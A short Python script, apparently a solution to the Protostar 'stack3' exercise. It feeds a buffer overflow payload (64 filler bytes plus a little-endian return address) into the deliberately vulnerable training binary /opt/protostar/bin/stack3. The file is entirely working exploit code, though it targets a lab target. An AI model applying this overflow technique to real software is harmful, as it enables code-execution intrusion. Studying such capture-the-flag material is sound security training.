import subprocess

def main():
    flag = (("A" * 64) + "\x24\x84\x04\x08")
    process = "/opt/protostar/bin/stack3"

    # print >> open("flag", 'w'), flag

    sp = subprocess.Popen(process, stdin=subprocess.PIPE)
    sp.communicate(input=flag)


if __name__ == '__main__':
    main()

